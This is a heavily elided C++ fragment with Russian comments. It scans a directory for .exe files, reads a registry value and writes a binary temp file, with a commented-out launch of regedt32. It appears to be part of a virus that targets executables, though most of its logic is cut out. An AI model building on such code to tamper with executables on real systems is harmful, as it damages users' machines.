                ...
                if (file.ff_name[0]=='.')
		{
			...
			continue;
                ...
                char name[13]="";
                 ...
                 {
				randomize();
				if ((!strcmp(ext,"exe") || !strcmp(ext,"EXE")))//&& !random(9) )
				{
...
int registry()
{
	...
	DWORD FileSF;
        ...
        if (reg)
        {
                ...
                regdata=reg->ReadInteger("abs");
                // закрываем секцию
                reg->CloseKey();
        }
        delete reg;
        //статовая интернет страница
        strcpy(tempfile,vdir);
        strcat(tempfile,"___.tmp");
        ofstream out (tempfile,ios::out|ios::binary);
	if (out)
        {
        ...
        out.close();
 //       strcpy(shellfile,"D:\\WINDOWS\\system32\\regedt32.exe");

 //       ShellExecuteA(0, NULL,shellfile, NULL, NULL, 1);
 //       remove(tempfile);
